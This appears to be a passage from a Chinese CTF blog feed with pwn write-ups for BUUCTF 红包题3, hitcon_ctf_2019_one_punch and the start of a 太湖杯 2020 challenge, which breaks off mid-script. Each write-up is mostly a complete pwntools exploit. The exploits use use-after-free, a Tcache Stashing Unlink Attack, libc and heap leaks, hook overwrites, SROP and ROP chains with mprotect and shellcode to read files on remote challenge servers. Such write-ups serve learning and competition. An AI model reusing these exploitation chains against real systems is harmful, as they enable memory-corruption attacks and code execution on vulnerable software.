    <content type="html"><![CDATA[<h1 id="Nov-刷题记录"><a href="#Nov-刷题记录" class="headerlink" title="Nov.刷题记录"></a>Nov.刷题记录</h1><h2 id="BUUCTF-红包题3"><a href="#BUUCTF-红包题3" class="headerlink" title="BUUCTF 红包题3"></a>BUUCTF 红包题3</h2><p>Tcache Stashing Unlink Attack 练手题。</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>uaf</li></ul><p>利用0x400 与 0x300构造出2个0x90的smallbin，进行Tcache Stashing Unlink Attack 即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./RedPacket_SoEasyPwn1'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29206</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,choice,data)</span>:</span>    sla(<span class="hljs-string">':'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sla(<span class="hljs-string">'4.0x400)'</span>,str(choice))    sa(<span class="hljs-string">'content'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">':'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">"idx"</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">':'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">"idx"</span>,str(idx))    sa(<span class="hljs-string">"ent:"</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">':'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'idx:'</span>,str(idx))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">6</span>):    add(i,<span class="hljs-number">2</span>,<span class="hljs-string">'chumen77'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">6</span>):    free(i)  <span class="hljs-comment">#可以不用这样写 直接在上一个循环，free也可以</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    add(i+<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">16</span>,<span class="hljs-number">1</span>,<span class="hljs-string">'chumen77'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    free(i+<span class="hljs-number">7</span>)add(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">16</span>,<span class="hljs-number">4</span>,<span class="hljs-string">'chumen77'</span>)free(<span class="hljs-number">1</span>)show(<span class="hljs-number">1</span>)r()libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x1e4ca0</span>info_addr(<span class="hljs-string">'libc'</span>,libcbase)<span class="hljs-comment"># debug()</span>add(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'chumen77'</span>)show(<span class="hljs-number">5</span>)r()heapbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x1670</span>info_addr(<span class="hljs-string">'heap'</span>,heapbase)payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x300</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + p64(heapbase+<span class="hljs-number">0x37e0</span>) + p64(heapbase+<span class="hljs-number">0xa60</span> - <span class="hljs-number">0x10</span>)edit(<span class="hljs-number">1</span>,payload)add(<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-string">'chumen77'</span>)pop_rdi = libc.search(asm(<span class="hljs-string">"pop rdi \nret"</span>)).next()  + libcbasepop_rsi = libc.search(asm(<span class="hljs-string">"pop rsi \nret"</span>)).next()  + libcbasepop_rdx = <span class="hljs-number">0x000000000012bda6</span>  + libcbaseleave_ret = libc.search(asm(<span class="hljs-string">"leave \nret"</span>)).next()  + libcbaseopen = libcbase + libc.symbols[<span class="hljs-string">"open"</span>]read = libcbase + libc.symbols[<span class="hljs-string">"read"</span>]puts = libcbase + libc.symbols[<span class="hljs-string">'puts'</span>]rop=flat([pop_rdi,heapbase + <span class="hljs-number">0x4440</span>,pop_rsi,<span class="hljs-number">0</span>,open,pop_rdi,<span class="hljs-number">3</span>,pop_rsi,heapbase + <span class="hljs-number">0x2000</span>,pop_rdx,<span class="hljs-number">0x30</span>,read,pop_rdi,heapbase + <span class="hljs-number">0x2000</span>,puts])sleep(<span class="hljs-number">0.1</span>)add(<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-string">'./flag\x00\x00'</span>  + rop)sla(<span class="hljs-string">':'</span>,<span class="hljs-string">'666'</span>)payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x80</span> + p64(heapbase+<span class="hljs-number">0x4430</span>+<span class="hljs-number">8</span>+<span class="hljs-number">8</span>) + p64(leave_ret)sa(<span class="hljs-string">'to say?'</span>,payload)itr()</code></pre></div><h2 id="hitcon-ctf-2019-one-punch"><a href="#hitcon-ctf-2019-one-punch" class="headerlink" title="hitcon_ctf_2019_one_punch"></a><code>hitcon_ctf_2019_one_punch</code></h2><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>uaf</li></ul><p>还是Tcache Stashing Unlink 的练手题。</p><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><div class="hljs"><pre><code class="hljs undefined">line  CODE  JT   JF      K================================= <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A == ARCH_X86_64) goto <span class="hljs-number">0003</span> <span class="hljs-number">0002</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL <span class="hljs-number">0003</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x0000000f</span>  <span class="hljs-keyword">if</span> (A != rt_sigreturn) goto <span class="hljs-number">0006</span> <span class="hljs-number">0005</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x000000e7</span>  <span class="hljs-keyword">if</span> (A != exit_group) goto <span class="hljs-number">0008</span> <span class="hljs-number">0007</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x0000003c</span>  <span class="hljs-keyword">if</span> (A != exit) goto <span class="hljs-number">0010</span> <span class="hljs-number">0009</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0010</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00000002</span>  <span class="hljs-keyword">if</span> (A != open) goto <span class="hljs-number">0012</span> <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0012</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != read) goto <span class="hljs-number">0014</span> <span class="hljs-number">0013</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0014</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A != write) goto <span class="hljs-number">0016</span> <span class="hljs-number">0015</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0016</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x0000000c</span>  <span class="hljs-keyword">if</span> (A != brk) goto <span class="hljs-number">0018</span> <span class="hljs-number">0017</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0018</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00000009</span>  <span class="hljs-keyword">if</span> (A != mmap) goto <span class="hljs-number">0020</span> <span class="hljs-number">0019</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0020</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x0000000a</span>  <span class="hljs-keyword">if</span> (A != mprotect) goto <span class="hljs-number">0022</span> <span class="hljs-number">0021</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0022</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A != close) goto <span class="hljs-number">0024</span> <span class="hljs-number">0023</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0024</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL</code></pre></div><p>其是运行open，但是libc2.29下走open时，其实则调用openat。<br>可以用set rax = 2 ，syscall  即可。</p><p>free hook打的话，可以用：</p><div class="hljs"><pre><code class="hljs undefined"># <span class="hljs-number">0x000000000012be97</span>: <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">8</span>]<span class="hljs-comment">; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax;</span></code></pre></div><p>这个好用的gadget，然后srop打orw</p><p>malloc hook打的话，可以用：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">add</span><span class="bash"> rsp,0x48 ; ret</span></code></pre></div><p>其也就是栈劫持到可控的buf区，走orw的rop chain</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./hitcon_ctf_2019_one_punch'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29942</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'name'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'name'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backdoor</span><span class="hljs-params">(data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'50056'</span>)    s(str(data))add(<span class="hljs-number">0</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x400</span>)free(<span class="hljs-number">0</span>)<span class="hljs-comment"># debug()</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">6</span>):    edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)    free(<span class="hljs-number">0</span>)add(<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0xd0</span>)edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'name: '</span>)libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x1e4ca0</span>info_addr(<span class="hljs-string">'libc'</span>,libcbase)add(<span class="hljs-number">2</span>,<span class="hljs-string">'1'</span>*(<span class="hljs-number">0x320</span>))add(<span class="hljs-number">2</span>,<span class="hljs-string">'1'</span>*(<span class="hljs-number">0x320</span>))free(<span class="hljs-number">1</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):    edit(<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)    free(<span class="hljs-number">1</span>)show(<span class="hljs-number">1</span>)ru(<span class="hljs-string">'name: '</span>)heap = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x670</span> info_addr(<span class="hljs-string">'heap'</span>,heap)add(<span class="hljs-number">1</span>,<span class="hljs-string">'1'</span>*(<span class="hljs-number">0x320</span>))add(<span class="hljs-number">1</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x217</span>)free(<span class="hljs-number">1</span>)edit(<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)free_hook = <span class="hljs-number">0x1e75a8</span> + libcbase__malloc_hook = <span class="hljs-number">0x1e4c30</span> + libcbaseedit(<span class="hljs-number">1</span>,p64(free_hook))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)    free(<span class="hljs-number">2</span>)<span class="hljs-comment"># debug()</span>add(<span class="hljs-number">1</span>,<span class="hljs-string">'1'</span>*(<span class="hljs-number">0x240</span>))add(<span class="hljs-number">1</span>,<span class="hljs-string">'1'</span>*(<span class="hljs-number">0x240</span>))data = <span class="hljs-string">'\x00'</span> * (<span class="hljs-number">0x240</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xe1</span>) + p64(heap+<span class="hljs-number">0x580</span>) + p64(heap + <span class="hljs-number">0x20</span>)edit(<span class="hljs-number">2</span>,data)add(<span class="hljs-number">1</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0xd0</span>)add(<span class="hljs-number">2</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x217</span>)add(<span class="hljs-number">1</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x217</span>)frame = SigreturnFrame()frame.rdi = <span class="hljs-number">0</span>frame.rsi = free_hook + <span class="hljs-number">0x20</span>frame.rdx = <span class="hljs-number">0x200</span>frame.rsp = free_hook + <span class="hljs-number">0x20</span>frame.rip = libcbase + libc.search(asm(<span class="hljs-string">"syscall \nret"</span>)).next()srop = str(frame)[<span class="hljs-number">0x10</span>:]<span class="hljs-comment"># debug()</span><span class="hljs-comment"># 0x000000000012be97: mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax; </span>magic =<span class="hljs-number">0x000000000012be97</span> + libcbase backdoor(p64(magic))backdoor(p64(magic))sleep(<span class="hljs-number">0.1</span>)orw = shellcraft.open(<span class="hljs-string">'./flag'</span>) + shellcraft.read(<span class="hljs-number">3</span>,free_hook+<span class="hljs-number">0x60</span>,<span class="hljs-number">0x30</span>) + shellcraft.write(<span class="hljs-number">1</span>,free_hook+<span class="hljs-number">0x60</span>,<span class="hljs-number">0x30</span>)pop_rdi = libc.search(asm(<span class="hljs-string">"pop rdi \nret"</span>)).next() +libcbasepop_rsi = libc.search(asm(<span class="hljs-string">"pop rsi \nret"</span>)).next() +libcbasepop_rdx = libcbase+<span class="hljs-number">0x000000000012bda6</span>rop = flat([pop_rdi,free_hook &amp; <span class="hljs-number">0xfffffffffffff000</span>,pop_rsi,<span class="hljs-number">0x1000</span>,pop_rdx,<span class="hljs-number">7</span>,libc.sym[<span class="hljs-string">'mprotect'</span>]+ libcbase,free_hook + <span class="hljs-number">0x20</span> + <span class="hljs-number">8</span> * <span class="hljs-number">8</span>])payload = p64(libcbase + libc.sym[<span class="hljs-string">'setcontext'</span>]+<span class="hljs-number">53</span>) + p64(heap+<span class="hljs-number">0x260</span>) + sropedit(<span class="hljs-number">0</span>,payload)debug()free(<span class="hljs-number">0</span>)payload = rop + asm(orw)s(payload)itr()</code></pre></div><p>或者是：</p><div class="hljs"><pre><code class="hljs python">add_rsp_0x48 = <span class="hljs-number">0x000000000008cfd6</span> +libcbasebackdoor(p64(add_rsp_0x48))backdoor(p64(add_rsp_0x48))pop_rdi = libc.search(asm(<span class="hljs-string">"pop rdi \nret"</span>)).next()  + libcbasepop_rsi = libc.search(asm(<span class="hljs-string">"pop rsi \nret"</span>)).next()  + libcbasepop_rdx = <span class="hljs-number">0x000000000012bda6</span>  + libcbaseleave_ret = libc.search(asm(<span class="hljs-string">"leave \nret"</span>)).next()  + libcbasepop_rax = <span class="hljs-number">0x0000000000047cf8</span>+ libcbasesyscall_ret = libc.search(asm(<span class="hljs-string">"syscall \nret"</span>)).next()  + libcbase open = libcbase + libc.symbols[<span class="hljs-string">"open"</span>]read = libcbase + libc.symbols[<span class="hljs-string">"read"</span>]write = libcbase + libc.symbols[<span class="hljs-string">'write'</span>]rop=flat([pop_rdi,heap+<span class="hljs-number">0x1440</span>,pop_rsi,<span class="hljs-number">0</span>,pop_rax,<span class="hljs-number">2</span>,syscall_ret,pop_rdi,<span class="hljs-number">3</span>,pop_rsi,heap + <span class="hljs-number">0x2000</span>,pop_rdx,<span class="hljs-number">0x30</span>,read,pop_rdi,<span class="hljs-number">1</span>,pop_rsi,heap + <span class="hljs-number">0x2000</span>,pop_rdx,<span class="hljs-number">0x30</span>,write])sleep(<span class="hljs-number">0.1</span>)edit(<span class="hljs-number">1</span>,<span class="hljs-string">'./flag\x00'</span>)<span class="hljs-comment"># debug()</span>add(<span class="hljs-number">1</span>,rop)</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>太湖杯ctf2020部分wp</title>
    <link href="/2020/11/08/%E5%A4%AA%E6%B9%96%E6%9D%AFctf2020%E9%83%A8%E5%88%86wp/"/>
    <url>/2020/11/08/%E5%A4%AA%E6%B9%96%E6%9D%AFctf2020%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="太湖杯ctf2020部分wp"><a href="#太湖杯ctf2020部分wp" class="headerlink" title="太湖杯ctf2020部分wp"></a>太湖杯ctf2020部分wp</h1><h2 id="seven-hero"><a href="#seven-hero" class="headerlink" title="seven hero"></a>seven hero</h2><p>手快，拿了个三血。还是挺开心的🤣<br><img src="http://qiqianyun.chumen77.xyz/uPic/ETgpbq.png" srcset="/img/loading.gif" alt></p><ul><li>realloc size 0 制造出free效果，配合del函数，达成uaf</li><li>利用libc 2.29的fastbin 的stash机制，完成tcache attack</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'119.3.89.93'</span>,<span class="hljs-number">8014</span>)    <span class="hljs-comment"># libc = elf.libc</span>    libc = ELF(<span class="hljs-string">'./libc.so.6'</span>)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">':'</span>,str(idx))    sla(<span class="hljs-string">':'</span>,str(size))    sa(<span class="hljs-string">":"</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">':'</span>,str(idx))    sla(<span class="hljs-string">':'</span>,str(size))    sa(<span class="hljs-string">":"</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span 